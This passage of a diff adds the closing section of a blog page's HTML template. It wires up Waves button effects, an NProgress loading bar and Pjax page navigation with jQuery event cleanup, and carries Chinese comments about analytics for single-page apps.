+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="/static/js-css/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="/static/js-css/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="/static/js-css/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
